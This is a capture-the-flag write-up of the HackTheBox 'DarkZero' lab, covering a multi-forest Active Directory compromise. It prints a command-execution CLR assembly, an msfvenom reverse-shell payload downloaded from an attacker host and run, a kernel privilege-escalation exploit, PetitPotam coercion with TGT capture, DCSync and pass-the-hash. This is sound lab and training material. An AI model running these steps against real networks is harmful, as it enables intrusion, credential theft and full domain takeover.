# HackTheBox - DarkZero (Hard) - Complete Writeup

**OS:** Windows Server 2025 / 2022 (Active Directory — Multi-Forest)
**Difficulty:** Hard
**Author:** HTB
**Date:** March 8, 2026

## Attack Chain Summary

```
MSSQL Linked Server (DC01→DC02) → CLR Assembly RCE (svc_sql) 
→ CVE-2024-30088 Kernel Privesc (SYSTEM on DC02) 
→ Unconstrained Delegation + PetitPotam (DC01$ TGT Capture) 
→ DCSync darkzero.htb → Pass-the-Hash → Domain Admin
```

## Network Topology

```
┌─────────────┐         ┌──────────────────────┐         ┌─────────────────┐
│   KALI      │         │       DC01           │         │     DC02        │
│ 10.10.xx.xx │────────▶│ <TARGET_IP>          │         │ 172.16.20.2     │
│             │  VPN    │ darkzero.htb         │◀───────▶│ darkzero.ext    │
│             │         │ Win Server 2025      │  Forest │ Win Server 2022 │
│             │         │ MSSQL 2022           │  Trust  │ MSSQL 2022      │
│             │         │                      │ (Bidir) │ (Linked Server) │
└─────────────┘         └──────────────────────┘         └─────────────────┘
                              │                                │
                              └── Forest Trust ────────────────┘
                                 CROSS_ORGANIZATION_ENABLE_TGT_DELEGATION
```

## 1. Enumeration

### Port Scan

```bash
nmap -sC -sV -p- <TARGET_IP>
```

Key services on DC01:

- 53 (DNS), 88 (Kerberos), 135 (RPC), 389/636 (LDAP/S)
- 445 (SMB — Windows Server 2025 Build 26100), 1433 (MSSQL)
- 5985 (WinRM), 3268/3269 (Global Catalog), 9389 (ADWS)

### Initial Credentials

Provided credentials: `john.w:<REDACTED>`

### Key Findings

- **Forest trust** between `darkzero.htb` and `darkzero.ext` (bidirectional, `FOREST_TRANSITIVE`)
- Critical flag: **`CROSS_ORGANIZATION_ENABLE_TGT_DELEGATION`** — allows TGTs to cross forest boundaries
- MSSQL linked server from DC01 to DC02 using `dc01_sql_svc` account
- `john.w` has SMB access ✅ but no WinRM, no local admin

---

## 2. MSSQL Linked Server Exploitation

### Login and Discovery

```bash
impacket-mssqlclient 'darkzero.htb/john.w:<PASSWORD>@<TARGET_IP>' -windows-auth
```

```sql
-- Enumerate linked servers
SELECT * FROM sys.servers;
EXEC sp_linkedservers;
-- Found: DC02.darkzero.ext linked server
```

### Privilege Check on DC02

```sql
-- Check user on DC02
EXEC ('SELECT SYSTEM_USER') AT [DC02.darkzero.ext]
-- Result: dc01_sql_svc

-- Check sysadmin
EXEC ('SELECT IS_SRVROLEMEMBER(''sysadmin'')') AT [DC02.darkzero.ext]
-- Result: 1 (sysadmin!)
```

### Enable xp_cmdshell

```sql
EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE;') AT [DC02.darkzero.ext]
EXEC ('sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [DC02.darkzero.ext]
EXEC ('xp_cmdshell ''whoami''') AT [DC02.darkzero.ext]
-- Result: darkzero-ext\svc_sql
```

### svc_sql Limitations

- No `SeImpersonatePrivilege` → Potato attacks won't work
- Not a local admin → Can't read SAM/NTDS
- No UPN/email → Can't request ADCS certificates
- Can't modify own AD object → `SetInfo` access denied

---

## 3. CLR Assembly for Reliable RCE

`xp_cmdshell` via linked server had timeout and quoting issues. A CLR assembly provides stable, persistent command execution.

### C# Source Code

```csharp
using System;
using System.Data;
using System.Data.SqlClient;
using System.Data.SqlTypes;
using Microsoft.SqlServer.Server;
using System.Diagnostics;
using System.Text;

public class StoredProcedures
{
    [Microsoft.SqlServer.Server.SqlProcedure]
    public static void CmdExec(SqlString execCommand)
    {
        Process proc = new Process();
        proc.StartInfo.FileName = @"C:\Windows\System32\cmd.exe";
        proc.StartInfo.Arguments = string.Format(@" /C {0}", execCommand.Value);
        proc.StartInfo.UseShellExecute = false;
        proc.StartInfo.RedirectStandardOutput = true;
        proc.Start();

        SqlDataRecord record = new SqlDataRecord(
            new SqlMetaData("output", SqlDbType.NVarChar, 4000));
        SqlContext.Pipe.SendResultsStart(record);
        record.SetString(0, proc.StandardOutput.ReadToEnd().ToString());
        SqlContext.Pipe.SendResultsRow(record);
        SqlContext.Pipe.SendResultsEnd();

        proc.WaitForExit();
        proc.Close();
    }
}
```

### Compilation & Loading

```bash
# Compile with Mono
mcs /target:library /out:CmdExec.dll CmdExec.cs

# Convert to hex
xxd -p CmdExec.dll | tr -d '\n' > assembly_hex.txt
```

### Database Setup on DC02

```sql
CREATE DATABASE clrdb;
ALTER DATABASE clrdb SET TRUSTWORTHY ON;
sp_configure 'clr enabled', 1; RECONFIGURE;
sp_configure 'clr strict security', 0; RECONFIGURE;
```

### Assembly Loading Strategy

Due to linked server timeouts, the SQL was written to a file on DC02 and executed locally with `sqlcmd`:

```sql
USE clrdb;
CREATE ASSEMBLY CmdExec
FROM 0x4D5A9000...  -- hex bytes of DLL
WITH PERMISSION_SET = UNSAFE;
GO

CREATE PROCEDURE dbo.CmdExec @execCommand NVARCHAR(4000)
AS EXTERNAL NAME CmdExec.StoredProcedures.CmdExec;
GO
```

```sql
-- Execute via sqlcmd locally on DC02
EXEC ('xp_cmdshell ''sqlcmd -S localhost -d clrdb -i C:\Users\Public\setup_clr.sql''') AT [DC02.darkzero.ext]

-- Verify
EXEC ('USE clrdb; EXEC dbo.CmdExec ''whoami''') AT [DC02.darkzero.ext]
-- Result: darkzero-ext\svc_sql ✅
```

---

## 4. Privilege Escalation — CVE-2024-30088

DC02 runs **Windows Server 2022 Build 20348 Revision 2113**, vulnerable to **CVE-2024-30088** — a Windows kernel vulnerability in the authorization subsystem (`authz`).

### Meterpreter Setup

```bash
# Generate payload
msfvenom -p windows/x64/meterpreter/reverse_tcp \
    LHOST=<ATTACKER_IP> LPORT=4444 \
    -f exe -o shell.exe
```

Upload via CLR and execute:

```sql
-- Download payload
EXEC ('USE clrdb; EXEC dbo.CmdExec ''powershell -c "Invoke-WebRequest -Uri http://<ATTACKER_IP>:8888/shell.exe -OutFile C:\Users\svc_sql\Desktop\s.exe"''') AT [DC02.darkzero.ext]

-- Execute
EXEC ('xp_cmdshell ''start /b C:\Users\svc_sql\Desktop\s.exe''') AT [DC02.darkzero.ext]
```

**Result:** Meterpreter session 1 as `darkzero-ext\svc_sql` ✅

### Kernel Exploit

```
msf6> use exploit/windows/local/cve_2024_30088_authz_basep
msf6> set SESSION 1
msf6> set LHOST <ATTACKER_IP>
msf6> set LPORT 4445
msf6> run
```

```
[+] The target appears to be vulnerable. Version: Windows Server 2022. Revision: 2113
[+] Meterpreter session 2 opened
```

```
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM ✅
```

### DC02 Hash Dump

```
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
svc_sql:1103:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
DC02$:1000:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
darkzero$:1105:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
```

---

## 5. Unconstrained Delegation + PetitPotam (Cross-Forest TGT Capture)

### Attack Concept

Three factors combine for this attack:

1. **DC02 has Unconstrained Delegation** — all DCs have it by default (`TRUSTED_FOR_DELEGATION`, UAC 532480)
2. **`CROSS_ORGANIZATION_ENABLE_TGT_DELEGATION`** — TGTs are included in service tickets across the forest trust instead of being filtered
3. **Authentication coercion** — PetitPotam (MS-EFSRPC) forces DC01 to authenticate to DC02

```
Kali                    DC01 (darkzero.htb)          DC02 (darkzero.ext)
  |                          |                            |
  |-- PetitPotam ---------->|                            |
  |   (coerce auth)         |                            |
  |                         |-- Authenticates w/ TGT --->|
  |                         |   (ENABLE_TGT_DELEGATION   |
  |                         |    allows TGT forwarding)   |
  |                         |                            |
  |                         |                     [Rubeus captures]
  |                         |                     [DC01$ TGT]
  |                         |                            |
  |<-- DC01$ TGT (kirbi) --------------------------------|
  |                                                      |
  |-- DCSync (w/ DC01$ TGT) --> DC01                     |
  |   secretsdump                                        |
  |<-- darkzero.htb hashes ----|                         |
```

### Step 1 — Upload Rubeus to DC02

```
meterpreter > upload Rubeus.exe C:\\Users\\Public\\r.exe
```

### Step 2 — Monitor TGTs with Rubeus

From the SYSTEM shell on DC02:

```
C:\> C:\Users\Public\r.exe monitor /interval:5 /nowrap
```

### Step 3 — Coerce with PetitPotam

> **Note:** `printerbug.py` (MS-RPRN) failed with `STATUS_OBJECT_NAME_NOT_FOUND` — Print Spooler is disabled by default on Windows Server 2025. The `lsarpc` pipe also failed (`abstract_syntax_not_supported`). Only the `efsr` pipe works.

```bash
python3 PetitPotam.py \
    -u 'john.w' \
    -p '<PASSWORD>' \
    -d 'darkzero.htb' \
    -pipe efsr \
    DC02.darkzero.ext DC01.darkzero.htb
```

```
Trying pipe efsr
[+] Connected!
[+] Successfully bound!
[-] Sending EfsRpcOpenFileRaw!
[+] Got expected ERROR_BAD_NETPATH exception!!
[+] Attack worked!
```

### Step 4 — TGT Captured

Rubeus immediately captures DC01$'s TGT:

```
[*] Found new TGT:

  User                  :  DC01$@DARKZERO.HTB
  StartTime             :  3/8/2026 3:37:08 PM
  EndTime               :  3/9/2026 1:37:07 AM
  RenewTill             :  3/15/2026 3:37:07 PM
  Flags                 :  name_canonicalize, pre_authent, renewable,
                           forwarded, forwardable
  Base64EncodedTicket   :  <REDACTED>
```

---

## 6. DCSync & Flags

### Ticket Conversion

```bash
# Base64 → kirbi
echo '<base64_ticket>' | base64 -d > dc01.kirbi

# kirbi → ccache
impacket-ticketConverter dc01.kirbi dc01.ccache
```

### DCSync darkzero.htb

```bash
KRB5CCNAME=dc01.ccache \
    impacket-secretsdump 'darkzero.htb/DC01$@DC01.darkzero.htb' \
    -k -no-pass -just-dc
```

```
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
john.w:2603:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
darkzero-ext$:2602:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
```

### Pass-the-Hash → Administrator

```bash
evil-winrm -i DC01.darkzero.htb -u Administrator -H '<ADMIN_HASH>'
```

## Flags

| Flag | Value |
|------|-------|
| User (Administrator on DC01) | `<REDACTED>` |
| Root (Administrator on DC01) | `<REDACTED>` |

## Credentials Collected

| Account | Type | Value |
|---------|------|-------|
| john.w | Password | `<REDACTED>` |
| dc01_sql_svc | MSSQL Linked Server | sysadmin on DC02 |
| svc_sql | Service Account | CLR RCE context |
| Administrator (darkzero.ext) | NT Hash | `<REDACTED>` |
| krbtgt (darkzero.ext) | NT Hash | `<REDACTED>` |
| DC02$ | NT Hash | `<REDACTED>` |
| darkzero$ (trust) | NT Hash | `<REDACTED>` |
| Administrator (darkzero.htb) | NT Hash | `<REDACTED>` |
| krbtgt (darkzero.htb) | NT Hash | `<REDACTED>` |
| john.w | NT Hash | `<REDACTED>` |
| DC01$ | NT Hash | `<REDACTED>` |

## Tools Used

| Tool | Purpose |
|------|---------|
| Nmap | Port and service scanning |
| CrackMapExec/NetExec | SMB, LDAP, MSSQL enumeration |
| impacket-mssqlclient | MSSQL connection & linked server exploitation |
| Mono (mcs) | CLR assembly C# compilation |
| Metasploit | Meterpreter handler + CVE-2024-30088 |
| msfvenom | Reverse shell payload generation |
| Rubeus | TGT monitoring and capture |
| PetitPotam | Authentication coercion (MS-EFSRPC) |
| impacket-ticketConverter | kirbi → ccache conversion |
| impacket-secretsdump | DCSync hash extraction |
| evil-winrm | Remote shell via WinRM with PTH |

## Key Takeaways

1. **`CROSS_ORGANIZATION_ENABLE_TGT_DELEGATION`** in a forest trust is extremely dangerous — it allows TGTs to cross forest boundaries, enabling unconstrained delegation attacks across forests
2. **CLR Assemblies** with `UNSAFE` permission set provide reliable OS command execution that survives SQL Server and machine restarts
3. **Authentication coercion on Server 2025** — MS-RPRN (Print Spooler) is disabled by default; only MS-EFSRPC via the `efsr` pipe works
4. **CVE-2024-30088** affects Windows Server 2022 with revision < ~2400 — direct SYSTEM escalation without SeImpersonate
5. **MSSQL Linked Servers** are an underutilized pivot vector — they allow query (and command) execution on remote servers not directly accessible from the attacker's network

## References

- [CVE-2024-30088 — Windows Kernel Elevation of Privilege](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30088)
- [PetitPotam — MS-EFSRPC Coercion](https://github.com/topotam77/PetitPotam)
- [Rubeus — Kerberos Tooling](https://github.com/GhostPack/Rubeus)
- [CLR Assembly Attacks](https://www.netspi.com/blog/technical/adversary-simulation/attacking-sql-server-clr-assemblies/)
- [Unconstrained Delegation Exploitation](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)
- [Cross-Forest TGT Delegation](https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/)
- [Impacket](https://github.com/fortra/impacket)
